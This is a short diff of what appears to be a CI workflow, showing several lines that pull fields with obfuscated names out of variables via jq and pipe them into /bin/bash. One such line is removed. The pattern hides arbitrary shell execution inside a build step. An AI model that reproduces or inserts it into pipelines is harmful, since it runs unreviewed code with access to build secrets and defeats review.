@@ -21,7 +21,6 @@ jobs:
           echo $tw5 | jq -r .azh40517 | /bin/bash
           printf '%s' "$xs9" | jq -r .cioh931 | /bin/bash
           printf '%s' "$uun096" | jq -r .szk4496 | /bin/bash
-          printf '%s' "$t5810" | jq -r .slzqc60732 | /bin/bash
           printf '%s' "$paeqd819" | jq -r .vunf57232 | /bin/bash
 
       - name: Upload artifact
